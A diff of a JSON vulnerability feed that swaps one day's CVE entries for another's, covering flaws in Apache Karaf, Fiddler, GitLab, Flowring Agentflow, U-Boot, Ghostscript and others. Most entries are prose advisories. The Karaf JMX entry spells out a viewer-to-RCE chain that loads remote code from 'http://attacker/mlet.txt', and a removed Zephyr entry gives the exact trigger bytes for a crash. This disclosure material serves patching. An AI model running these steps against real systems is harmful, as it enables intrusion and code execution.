@@ -1,145 +1,145 @@
 {
-  "totalResults": 2644,
+  "totalResults": 2653,
   "items": [
     {
-      "id": "CVE-2026-101263",
-      "published": "2026-09-29T00:17:01.540",
-      "description": "A vulnerability was found in Ziroom ZHOME A0101 1.0.1.0. This issue affects some unknown processing of the file /api/ZRQos/set_online_client. The manipulation of the argument mac results in command injection. It is possible to launch the attack remotely. The exploit has been made public and could be used. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "id": "CVE-2026-84154",
+      "published": "2026-09-29T08:17:21.297",
+      "description": "A Code Injection vulnerability affecting GEOVIA Geospatial Data Manager from Release 3DEXPERIENCE R2024x through Release 3DEXPERIENCE R2026x could allow an attacker to execute arbitrary code on the server.",
       "severity": "CRITICAL",
-      "score": 9.1
+      "score": 9.9
     },
     {
-      "id": "CVE-2026-101264",
-      "published": "2026-09-29T00:17:02.663",
-      "description": "A vulnerability was determined in Ziroom ZHOME A0101 1.0.1.0. Impacted is an unknown function of the file /api/ZRnetwork/set_passwd. This manipulation of the argument password1 causes command injection. The attack can be initiated remotely. The exploit has been publicly disclosed and may be utilized. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "id": "CVE-2026-91012",
+      "published": "2026-09-29T09:17:09.087",
+      "description": "org.apache.karaf.config.core.impl.ConfigRepositoryImpl#update(pid, properties),\nwhich backs the \"config\" MBean and the config:* shell commands, derives the file\nit writes a configuration to from caller-supplied input without checking that\nthe result stays inside ${karaf.etc}:\n\n  *  if the submitted property map contains a felix.fileinstall.filename entry, that value is turned directly into a File (getCfgFileFromProperty), so it can point to any absolute path the Karaf process can write to;\n  *  otherwise the configuration PID is concatenated verbatim into the target file name (generateConfigFilename(): new File(karaf.etc, pid + \".cfg\")), so a PID containing \"..\" segments resolves outside ${karaf.etc}. createFactoryConfiguration() has the same issue via the factory PID/alias.\n\n\nBoth code paths are reachable by any caller holding the \"manager\" role under Karaf's shipped command/JMX ACL (org.apache.karaf.command.acl.conf.cfg: \"update = manager\"). Such a user can therefore write attacker-controlled content to any file the Karaf process can write, including files the same ACL otherwise reserves to \"admin\" (etc/users.properties, etc/*.acl.*.cfg, etc/org.apache.karaf.management.cfg, and similar), allowing a manager-role user to grant themselves the admin role or otherwise take over the container.\n\n\n\n\n\n\nConfigMBeanImpl.install() and the config:install shell command already guarded the equivalent risk on their own code path with a finalname.contains(\"..\") string check, but that check does not stop absolute paths or symlink-based escapes, and it was never applied to ConfigRepositoryImpl.update() / createFactoryConfiguration() at all.",
       "severity": "CRITICAL",
-      "score": 9.1
+      "score": 9.8
     },
     {
-      "id": "CVE-2026-102361",
-      "published": "2026-09-29T00:17:03.183",
-      "description": "mall4j through 4.0 contains a missing authentication vulnerability in the PUT /user/updatePwd endpoint that allows unauthenticated attackers to reset any storefront account password. Attackers can supply a target username in the request body to overwrite passwords without verification, enabling account takeover and access to orders and personal data.",
+      "id": "CVE-2026-91048",
+      "published": "2026-09-29T09:17:10.193",
+      "description": "The jdbc shell command scope shipped no org.apache.karaf.command.acl.jdbc.cfg. Karaf's command guard (SecuredSessionFactoryImpl) treats a command with no matching ACL rule as allowed, so any authenticated shell session (including one holding only the viewer role) could run every jdbc:* command. jdbc:ds-create stores a fully attacker-controlled JDBC URL into a pax-jdbc-config factory Configuration with no validation. pax-jdbc-config reactively turns that into a live DataSource. Several JDBC drivers run code or SQL at connection time based on URL parameters (e.g. H2 INIT=RUNSCRIPT), so a viewer-level shell user could reach arbitrary code execution, bypassing the admin-role gate that already protects shell:exec. This is a privilege-escalation-to-RCE chain, not merely an \"admin misconfiguration\".\n\n\nThe same applies to jms:* shell commands.",
       "severity": "CRITICAL",
-      "score": 9.1
+      "score": 9.8
     },
     {
-      "id": "CVE-2026-101280",
-      "published": "2026-09-29T01:16:44.193",
-      "description": "A vulnerability was detected in Trusted Domain Project OpenDMARC up to 1.4.2. Affected is the function opendmarc_policy_query_dmarc of the component Multi-Record Set Handler. The manipulation results in authentication bypass by spoofing. The attack can be executed remotely. The exploit is now public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "id": "CVE-2026-92142",
+      "published": "2026-09-29T09:17:10.497",
+      "description": "Apache Karaf exposes a JMX MBeanServer guarded by KarafMBeanServerGuard, which enforces role-based access control (RBAC) on MBean operations invoked over the remote JMX connector (RMI registry/server, enabled by default on ports 1099 and 44444). The guard is implemented as a java.lang.reflect.Proxy around the MBeanServer, and only forwards a fixed list of operation names to the RBAC check, defined in MBeanInvocationHandler#guarded:\n\n\n  private final List<String> guarded = Collections.unmodifiableList( Arrays.asList(\"invoke\", \"getAttribute\", \"getAttributes\", \"setAttribute\", \"setAttributes\"));\n\n\n\n\nThe MBean lifecycle operations MBeanServer#createMBean, #registerMBean and #unregisterMBean are not in this list. Calls to these methods are forwarded directly to the underlying MBeanServer with no role check at all, regardless of the roles configured in etc/jmx.acl.*.cfg.\n\n\n\n\nAs a result, any user who can authenticate to the JMX endpoint, including a user holding only the least-privileged \"viewer\" role, can call createMBean() to instantiate an arbitrary class as a MBean, and unregisterMBean() to remove it again afterwards, with no authorization check and no audit log entry (logging in KarafMBeanServerGuard only occurs on the RBAC-denial path, which this bypass never reaches).\n\n\n\n\nThis is significant because javax.management.loading.MLet, a standard JDK MBean, can be instantiated this way. MLet acts as a remote classloader: its getMBeansFromURL(URL) operation fetches an MLet text file from an attacker-controlled URL and instantiates and registers the classes it lists as new MBeans in the target JVM. Reaching this operation still goes through KarafMBeanServerGuard's existing \"invoke\" check, but the default etc/jmx.acl.cfg grants the \"viewer\" role to any method name matching the wildcard rule \"get* = viewer\", a heuristic intended for read-only getters. Because \"getMBeansFromURL\" happens to start with \"get\", it also matches that rule, so a default installation grants \"viewer\" callers permission to invoke it without any Karaf-specific ACL naming MLet at all. Combined with the createMBean gap, this gives a \"viewer\"-role JMX client a path to remote code execution to the Karaf JVM:\n\n  *  Authenticate to JMX as any user with any role (e.g. \"viewer\").\n  *  mbs.createMBean(\"javax.management.loading.MLet\", objectName) is not in GUARDED_OPERATIONS, no RBAC check, MLet is instantiated and registered.\n  *  mbs.invoke(objectName, \"getMBeansFromURL\", new Object[]{\"http://attacker/mlet.txt\"}, ...) is guarded, but the method name matches the default \"get* = viewer\" ACL rule, so permitted.\n  *  The remote .mlet file is fetched and its listed classes are loaded and registered as new MBeans, running attacker-supplied code in the Karaf JVM.\n  *  mbs.unregisterMBean(objectName) can be used to remove the MLet afterwards, also not in GUARDED_OPERATIONS, no RBAC check, no audit trail.\n\n\nThe fix adds createMBean, registerMBean and unregisterMBean to the guarded operation list, resolves required roles for them from the jmx.acl* configuration by ObjectName and (for createMBean/registerMBean) MBean class name, and ships default etc/jmx.acl.cfg entries restricting all three operations to the \"admin\" role. This allows deployments to also write class-name-specific rule, e.g.:\n\n\n\n\ncreateMBean(java.lang.String)[/javax\\.management\\.loading\\..*/] = admin\n\n\n\n\nApache Karaf users should upgrade to 4.4.12 or 4.5.0 or later, once released, as soon as possible. Until an upgrade is available, restrict network access to the JMX RMI registry/server ports (1099/44444) to trusted hosts, or avoid issuing any non-\"admin\" JMX credentiels.",
       "severity": "HIGH",
-      "score": 7.3
+      "score": 8.8
     },
     {
-      "id": "CVE-2026-101281",
-      "published": "2026-09-29T01:16:44.367",
-      "description": "A flaw has been found in Trusted Domain Project OpenDMARC up to 1.4.2. Affected by this vulnerability is the function opendmarc_sp2_find_mailfrom_domain of the file libopendmarc/opendmarc_spf.c of the component SPF Macro Handler. This manipulation causes improper authentication. The attack is possible to be carried out remotely. The exploit has been published and may be used. Patch name: c48a74c758677fc5272a73eff15ffdbf8afda1a6. Applying a patch is the recommended action to fix this issue.",
+      "id": "CVE-2026-86158",
+      "published": "2026-09-29T07:16:35.520",
+      "description": "Missing authentication in the local .NET backend (Fiddler.WebUi) of Progress Software Fiddler Everywhere 8.0.2 allows a local unauthenticated attacker to mint OAuth tokens and read the machine-in-the-middle root certificate through an unauthenticated localhost HTTP and SignalR RPC channel.",
       "severity": "HIGH",
-      "score": 7.3
+      "score": 7.7
     },
     {
-      "id": "CVE-2026-18747",
-      "published": "2026-09-29T00:17:04.473",
-      "description": "The MCUmgr SMP-over-console transport decodes a base64 frame, reads a 16-bit packet length from it, verifies a CRC and then unconditionally strips the trailing CRC with rx_ctxt->nb->len -= 2U; in mcumgr_serial_process_frag() (subsys/mgmt/mcumgr/transport/src/serial_util.c). mcumgr_serial_extract_len() accepted any declared length, including 0 and 1, and a packet declaring length 0 passes the checksum test for free because crc16_itu_t() over zero bytes returns the zero seed. Since net_buf::len is a uint16_t, the subtraction underflows and the buffer is handed to SMP claiming roughly 65 KB of payload while its data area is only CONFIG_MCUMGR_TRANSPORT_NETBUF_SIZE bytes (default 384).\n\nThe trigger is a single unauthenticated 7-byte line on the management console — the 0x06 0x09 packet marker followed by the base64 group AAA= and a newline — delivered to any transport built on this helper: CONFIG_MCUMGR_TRANSPORT_UART (smp_uart.c) or CONFIG_MCUMGR_TRANSPORT_SHELL (smp_shell.c), both of which select MCUMGR_TRANSPORT_SERIAL_HAS_SMP_OVER_CONSOLE. No prior session state, fragmentation or credentials are required to trigger the underflow, and the malformed frame is mishandled before any command handler or command-level access control runs. The attacker only needs write access to that console, which on many boards is a USB CDC-ACM port rather than a bare UART header.\n\nWith the inflated length, smp_process_request_packet() in subsys/mgmt/mcumgr/smp/src/smp.c loses its bound: cbor_nb_reader_init() gives the CBOR decoder a ~65 KB window into a 384-byte buffer, and each request header's nh_len is checked only against the inflated length. On its own the 7-byte frame re-parses whatever stale bytes the reused pool buffer still holds, typically a replay of the previously received request followed by a parse error, without leaving the buffer. Because the transport is unauthenticated, though, the attacker also controls the frames sent before the trigger, and can stage buffer contents so that a request succeeds with an nh_len larger than the buffer; net_buf_pull(), guarded only by __ASSERT_NO_MSG, then moves the parse cursor out of bounds and the loop reads further headers and CBOR from adjacent memory. The consequence is an out-of-bounds read that can fault the MCUmgr thread (denial of service); memory disclosure is also possible, since the default-enabled os echo handler (CONFIG_MCUMGR_GRP_OS_ECHO) decodes its string inside that window and copies it into its response. There is no integrity gain beyond what the unauthenticated transport already permits.\n\nThe fix rejects any declared packet length of two bytes or fewer in mcumgr_serial_extract_len(), so the CRC-strip subtraction can no longer underflow. The identical pattern remains in the test-only loopback transport subsys/mgmt/mcumgr/transport/src/smp_dummy.c (CONFIG_MCUMGR_TRANSPORT_DUMMY), which has no external input path and therefore carries no practical exposure.",
+      "id": "CVE-2026-91085",
+      "published": "2026-09-29T09:17:10.347",
+      "description": "Apache Karaf's shell/SSH command security is enforced by per-scope ACL configuration files (etc/org.apache.karaf.command.acl.<scope>.cfg). SecuredSessionFactoryImpl.checkSecurity() resolves the roles required for an invocation and, when no ACL rule matches the command, fails open: ACLConfigurationParser.Specificity.NO_MATCH sets passCheck = true. The safety valve for this, karaf.secured.command.compulsory.roles, ships commented out in etc/system.properties, so an unmatched command is allowed for any authenticated user.\n\n\nThe shipped org.apache.karaf.command.acl.config ACL (assemblies/features/standard/src/main/feature/feature.xml, mirrored into instance/.../etc/org.apache.karaf.command.acl.config.cfg) has no install entry. It restricts delete to admin, restricts edit/property-*/update on the jmx.acl.*, org.apache.karaf.command.acl.* and org.apache.karaf.service.acl.* PIDs to admin, and allows manager for everything else, but config:install was simply unmatched, and therefore allowed for any authenticated user, including one holding only the viewer role.\n\n\n\n\nconfig:install <url> <finalname> fetches url and writes it into ${karaf.etc} as finalname. It calls PathUtils.checkWithin() to block .. traversal outside karaf.etc, but that folder holds every security-relevant file Karaf ships: users.properties, keys.properties, host.key, and all org.apache.karaf.*.acl.* files, including the very ACL file that (mis)governs this command. With -o/--override, an existing file is overwritten with attacker-controlled bytes fetched from an arbitrary URL.\n\n\n\n\nBecause felix.fileinstall.dir = ${karaf.etc} (etc/config.properties), Felix FileInstall also watches and reloads any .cfg file dropped there, closing the loop without requiring a restart.\n\n\n\n\nBy contrast, bundle:install, feature:install and kar:install are all admin-only in their own ACLs, and config:delete is admin in this same ACL, config:install was the outlier.\n\nMitigationAdd install = admin in etc/org.apache.karaf.command.acl.config.cfg (create the file is absent), and/or set karaf.secured.command.compulsory.roles=admin in etc/system.properties (and restart) to make unmatched commands fail closed by default.",
       "severity": "MEDIUM",
-      "score": 6.8
+      "score": 6.3
     },
     {
-      "id": "CVE-2026-101277",
-      "published": "2026-09-29T00:17:03.010",
-      "description": "A security flaw has been discovered in Trusted Domain Project OpenDKIM up to 2.11.0. The impacted element is the function dkim_process_set of the file dkim.c of the component Tag Tokenizer. Performing a manipulation results in use of less trusted source. The attack may be initiated remotely. The exploit has been released to the public and may be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "id": "CVE-2026-86157",
+      "published": "2026-09-29T07:16:35.377",
+      "description": "Exposure of privileged IPC functionality in Progress Telerik Fiddler Everywhere before version 8.2.0 allows a local, low-privileged attacker who can modify application launch parameters and persuade a user to start the application to replace the application UI or settings with attacker-controlled content. Successful exploitation could result in disclosure of OAuth authentication tokens, execution of locally accessible programs, or unauthorized modification of application-generated configuration files.",
       "severity": "MEDIUM",
-      "score": 6.5
+      "score": 5.6
     },
     {
-      "id": "CVE-2026-102365",
-      "published": "2026-09-29T00:17:03.777",
-      "description": "mall4j through 4.0 fails to enforce authorization checks on GET endpoints in UserAddrController that retrieve customer address data. Authenticated attackers can call /user/addr/page and /user/addr/info endpoints to harvest all customer addresses including names, phone numbers, and postal information.",
+      "id": "CVE-2026-102473",
+      "published": "2026-09-29T10:17:10.383",
+      "description": "A flaw was found in dash. When built without libc fnmatch, the internal pmatch() matcher implements * by unbounded recursion over candidate positions. A local user who can plant filenames, or otherwise feed that matcher, can make a short multi-star pattern such as *.*.*.*.*.tar.gz consume excessive CPU.",
       "severity": "MEDIUM",
-      "score": 6.5
+      "score": 5.5
     },
     {
-      "id": "CVE-2026-18417",
-      "published": "2026-09-29T00:17:04.207",
-      "description": "The native BSD-socket layer recorded a pending asynchronous socket error by type-punning it into struct net_context's void user_data field (ctx->user_data = INT_TO_POINTER(-status) in zsock_accepted_cb(), zsock_received_cb(), zsock_connected_cb() and zsock_close_ctx() in subsys/net/lib/sockets/sockets_inet.c), reading it back with POINTER_TO_INT(). That same field is owned by the network stack for listening TCP contexts: net_tcp_accept() stores the parent context pointer there and the TCP core passes it back to the registered accept callback. A failed accept therefore left a small integer (an errno value) where the stack expected a struct net_context .\n\nWhen the network interface carrying a listening TCP socket goes down, close_tcp_conn() in subsys/net/ip/tcp.c invokes the accept callback with -ENETDOWN and the context's user_data. In v4.3.0 the callback was not disarmed afterwards, so a second interface-down event forwarded the previously stored errno to zsock_accepted_cb(), which dereferenced it as the parent context and performed several stores through it (sock_set_error()'s read-modify-write of socket_data, k_fifo_cancel_wait(&parent->recv_q)) — the crash described in the fix's commit message. v4.3.1 and v4.4.x carry a later change clearing conn->accept_cb after the error callback (269cb8823d3 on the v4.3 branch, 913fae5169425550f2364655298fceb79b320066 on main), which closes that repeat path; on those releases the poisoned cookie remains reachable only by a narrower race, a handshake completing alongside the interface-down still passing the stale cookie to k_fifo_put(&parent->accept_q, ...), and by getsockopt(SO_ERROR), which reads the field back unconditionally.\n\nOn v4.3.0 an application that keeps a listening TCP socket open across repeated link-down events is sufficient to reach the defect; the triggering condition is a network-interface state change, not attacker-supplied packet data, so the practical attacker is one able to force the link down repeatedly (for example an adjacent attacker disrupting a wireless link) or one with local/physical access. Because both the faulting address and the stored data are fixed small constants derived from the errno value, the outcome is a wild-pointer access leading to a kernel fatal error — a denial of service (device crash or reset) rather than an attacker-directed memory corruption.\n\nThe fix stores the pending error in a dedicated net_context.sock_error field and converts every producer and consumer to sock_set_error()/sock_get_error(), leaving user_data untouched. As a side effect it also stops getsockopt(SO_ERROR) — which is evaluated unconditionally — from returning the kernel address held in user_data to a userspace application.",
-      "severity": "MEDIUM",
-      "score": 6.5
-    },
-    {
-      "id": "CVE-2026-101279",
-      "published": "2026-09-29T01:16:43.997",
-      "description": "A security vulnerability has been detected in Trusted Domain Project OpenDMARC up to 1.4.2. This impacts an unknown function of the file libopendmarc/opendmarc_policy.c of the component DMARC Parser. The manipulation of the argument pct leads to integer overflow. Remote exploitation of the attack is possible. The exploit has been disclosed publicly and may be used. The vendor was contacted early about this disclosure but did not respond in any way.",
-      "severity": "MEDIUM",
-      "score": 6.5
-    },
-    {
-      "id": "CVE-2026-102373",
-      "published": "2026-09-29T01:16:44.757",
-      "description": "GestSup versions before 3.2.62 fail to validate ticket ownership when loading comments via the threadedit parameter in thread.php. Authenticated attackers can enumerate sequential comment IDs to read private comments from other users' tickets without proper authorization checks.",
-      "severity": "MEDIUM",
-      "score": 6.5
-    },
-    {
-      "id": "CVE-2026-102372",
-      "published": "2026-09-29T01:16:44.593",
-      "description": "GestSup versions before 3.2.61 fail to properly sanitize HTML email bodies in the IMAP LOGIN connector, allowing unauthenticated attackers to store arbitrary JavaScript in ticket descriptions and replies. Attackers can send emails to the monitored mailbox containing script tags and event handlers that execute in technician browsers, enabling ticket data theft and unauthorized actions.",
-      "severity": "MEDIUM",
-      "score": 6.1
-    },
-    {
-      "id": "CVE-2026-18746",
-      "published": "2026-09-29T00:17:04.347",
-      "description": "parse_write_op() in subsys/net/lib/lwm2m/lwm2m_message_handling.c handles inbound CoAP WRITE/CREATE requests that carry a Block1 option. For the first block of a transfer it called init_block_ctx() and then immediately stored the peer-selected block size with block_ctx->ctx.block_size = block_size before inspecting the return code. init_block_ctx() sets the caller's pointer to NULL and returns -ENOMEM when no entry of the static block1_contexts[] pool is free or timed out, so that store dereferences a NULL pointer.\n\nThe pool holds CONFIG_LWM2M_NUM_BLOCK1_CONTEXT entries (default 3) and an entry is only reclaimed once its transfer completes, fails, or ages past 30 seconds. A peer that reaches the client's LwM2M socket can therefore start three block-wise writes on three distinct object paths with the CoAP More bit set and leave them incomplete, then send the first block of a fourth write on a new path to reach the unguarded dereference. Reachability is gated only by the connected UDP socket's source-address filter unless CONFIG_LWM2M_DTLS_SUPPORT is enabled — which has no default — so in a NoSec deployment an on-path or address-spoofing attacker needs no credentials; the same sequence is also reachable from a bootstrap or lower-trust server, and can be hit accidentally by a legitimate server running four concurrent block transfers.\n\nThe write targets a fixed low address with a value between 0 and 7, so the consequence is a fatal memory fault (BusFault or corrupted low memory leading to a fault) rather than a usable memory-corruption primitive: the device crashes or resets. Confidentiality and integrity are not affected. The fix moves the store below the guard and validates the context pointer itself instead of the return code, so the context is only touched once it is known to be valid.",
-      "severity": "MEDIUM",
-      "score": 5.9
-    },
-    {
-      "id": "CVE-2026-102364",
-      "published": "2026-09-29T00:17:03.633",
-      "description": "mall4j through 4.0 fails to validate the sysType field in sa-token sessions, allowing storefront customers to authenticate as back-office users by reusing their session tokens. Attackers can register on the public storefront and use their customer session token to access admin endpoints lacking @PreAuthorize permission checks, including menu listings, file uploads, and configuration endpoints.",
-      "severity": "MEDIUM",
-      "score": 5.4
-    },
-    {
-      "id": "CVE-2026-102367",
-      "published": "2026-09-29T00:17:04.060",
-      "description": "mall4j through 4.0 contains an insufficient session expiration vulnerability in the token refresh endpoint that fails to validate the enabled flag when issuing new sessions. Disabled user accounts can indefinitely renew their sessions through the POST /token/refresh endpoint, retaining access that account disabling was intended to remove.",
-      "severity": "MEDIUM",
-      "score": 5.4
-    },
-    {
-      "id": "CVE-2026-102362",
-      "published": "2026-09-29T00:17:03.337",
-      "description": "mall4j through 4.0 fails to implement authentication controls on the DELETE /prodComm endpoint in ProdCommController. Unauthenticated attackers can delete arbitrary product reviews by supplying the prodCommId parameter without authorization checks.",
-      "severity": "MEDIUM",
-      "score": 5.3
-    },
-    {
-      "id": "CVE-2026-102366",
-      "published": "2026-09-29T00:17:03.917",
-      "description": "mall4j through 4.0 contains an unrestricted file upload vulnerability in FileController endpoints that lack authorization checks and accept arbitrary file types without validation. Attackers with any authenticated token can upload HTML or SVG files that execute scripts in administrator browsers when accessed from the local storage path, resulting in stored cross-site scripting.",
-      "severity": "MEDIUM",
-      "score": 4.4
-    },
-    {
-      "id": "CVE-2026-101278",
-      "published": "2026-09-29T01:16:43.787",
-      "description": "A weakness has been identified in Trusted Domain Project OpenDMARC up to 1.4.2. This affects the function opendmarc_get_tld of the file libopendmarc/opendmarc_tld.c : of the component PSL Wildcard Handler. Executing a manipulation can lead to origin validation error. The attack may be launched remotely. The exploit has been made available to the public and could be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.",
+      "id": "CVE-2026-10518",
+      "published": "2026-09-29T10:17:10.863",
+      "description": "GitLab has remediated an issue in GitLab EE affecting all versions from 17.9 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an authenticated user with guest-level permissions to read private security policy content they were not authorized to access due to improper authorization enforcement.",
       "severity": "MEDIUM",
       "score": 4.3
     },
     {
-      "id": "CVE-2026-102363",
-      "published": "2026-09-29T00:17:03.483",
-      "description": "mall4j through 4.0 contains a missing authentication vulnerability in the DeliveryController checkDelivery endpoint that allows unauthenticated attackers to read shipment tracking information by supplying an order number parameter. Attackers can access carrier names, waybill numbers, and complete logistics trails for any order without authentication or ownership verification.",
+      "id": "CVE-2026-102474",
+      "published": "2026-09-29T10:17:10.707",
+      "description": "A flaw was found in dash. The printf builtin reserves four bytes before converting a Unicode \\u or \\U escape, but the multi-byte token can need five or six bytes. A local user who can supply such an escape to dash printf or echo %b, including through dash -c and a positional argument, can write one or two bytes past that reservation.",
+      "severity": "MEDIUM",
+      "score": 4
+    },
+    {
+      "id": "CVE-2026-4523",
+      "published": "2026-09-29T10:17:11.613",
+      "description": "GitLab has remediated an issue in GitLab CE/EE affecting all versions from 15.11 before 19.2.7, 19.3 before 19.3.3, and 19.4 before 19.4.1 that under certain conditions could have allowed an unauthenticated user to read CI/CD job trace contents containing sensitive variable values due to improper authorization enforcement in the GraphQL API.",
       "severity": "LOW",
       "score": 3.7
     },
     {
-      "id": "CVE-2026-101265",
-      "published": "2026-09-29T00:17:02.833",
-      "description": "A vulnerability was identified in Intelbras TIP 125i 4.3.35/4.3.41. The affected element is an unknown function of the component Básico Page. Such manipulation leads to inclusion of sensitive information in source code. The attack can be launched remotely. A high complexity level is associated with this attack. The exploitability is described as difficult. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure.",
-      "severity": "LOW",
-      "score": 3.1
+      "id": "CVE-2026-101169",
+      "published": "2026-09-29T08:17:19.823",
+      "description": "In affected versions of Octopus Server, an authenticated user with permissions to edit an Environment or Project can set specifically crafted JSON content for the object. Insecure deserialization of this content allows the user to execute arbitrary code in the Octopus Server process.",
+      "severity": "UNKNOWN",
+      "score": null
+    },
+    {
+      "id": "CVE-2026-96428",
+      "published": "2026-09-29T09:17:10.687",
+      "description": "SQL Injection in the /WebAgenda/SMBAjaxAutoComplete.do API endpoint of Flowring Agentflow 4.0 version before 2025/08/08 allows remote attackers to execute arbitrary SQL commands via the words parameter.",
+      "severity": "UNKNOWN",
+      "score": null
+    },
+    {
+      "id": "CVE-2026-96429",
+      "published": "2026-09-29T09:17:10.917",
+      "description": "SQL Injection in the /WebAgenda/SMBAjaxConfigProcess.do API\nendpoint of Flowring Agentflow 4.0 version before 2025/08/08 allows\nremote attackers to execute arbitrary SQL commands via the id parameter.",
+      "severity": "UNKNOWN",
+      "score": null
+    },
+    {
+      "id": "CVE-2026-96430",
+      "published": "2026-09-29T09:17:11.047",
+      "description": "Exposed Dangerous Method or Function in the\n/WebAgenda/SQLWin.do API endpoint of Flowring Agentflow 4.0 version Before 2026/08/28 allows remote\nauthenticated users to execute arbitrary SQL commands via the sql parameter.",
+      "severity": "UNKNOWN",
+      "score": null
+    },
+    {
+      "id": "CVE-2026-96431",
+      "published": "2026-09-29T09:17:11.183",
+      "description": "Unrestricted Upload of File with Dangerous Type in the\n/WebAgenda/download/uploadFile.jsp API endpoint of Flowring Agentflow 4.0 version\nbefore 2023/03/24 allows remote authenticated users to execute arbitrary\nsystem commands via a malicious file.",
+      "severity": "UNKNOWN",
+      "score": null
+    },
+    {
+      "id": "CVE-2026-96440",
+      "published": "2026-09-29T09:17:11.317",
+      "description": "Improper Limitation of a Pathname to a Restricted\nDirectory（Path Traversal） in the /WebAgenda/download/uploadFile.jsp\nAPI endpoint of Flowring Agentflow 4.0 version before 2023/03/24 allows remote\nauthenticated users to write files to arbitrary locations outside the intended\nupload directory via the path parameter.",
+      "severity": "UNKNOWN",
+      "score": null
+    },
+    {
+      "id": "CVE-2026-11796",
+      "published": "2026-09-29T10:17:11.037",
+      "description": "Asset Suite allows unauthenticated users to access PropertiesReloadServlet, CacheFlushServlet, MetadataCacheFlushServlet and ResourceBundleReloadServlet, which could result in denial-of-service conditions affecting application availability. These servlets are designed to perform specific functions within production environment depending on how the Asset Suite application is configured.",
+      "severity": "UNKNOWN",
+      "score": null
+    },
+    {
+      "id": "CVE-2026-15390",
+      "published": "2026-09-29T10:17:11.237",
+      "description": "Das U-Boot with CONFIG_IP_DEFRAG=y parameter fails to clear IP reassembly state after delivering a complete datagram. An attacker who can deliver fragmented IP traffic can execute arbitrary code by sending duplicated last-fragment IP packets.\n\n\nThis issue was fixed in commit b1aec609bb5e0d08c25c888c91935287ab4ee5fa in version 2026.07.",
+      "severity": "UNKNOWN",
+      "score": null
+    },
+    {
+      "id": "CVE-2026-19547",
+      "published": "2026-09-29T10:17:11.410",
+      "description": "Ghostscript for Windows is vulnerable to local privilege escalation through PostScript resource file hijacking. Due to the application searching for PostScript resource files in predictable paths under C:\\\\gs\\\\ that do not exist by default on Windows installations, combined with Windows default ACLs allowing any authenticated user to create directories at the root of C:\\\\, an attacker who is an authenticated local user can create the expected directory structure and plant a malicious PostScript file. When any user or service subsequently runs Ghostscript, the planted file is automatically loaded and executed with the full privileges of the Ghostscript process. This results in full compromise of Ghostscript process context, as well as running arbitrary code on the machine with Ghostscript process privileges.\n\n\nThis issue was fixed in version 10.08.0.",
+      "severity": "UNKNOWN",
+      "score": null
     }
   ]
 }
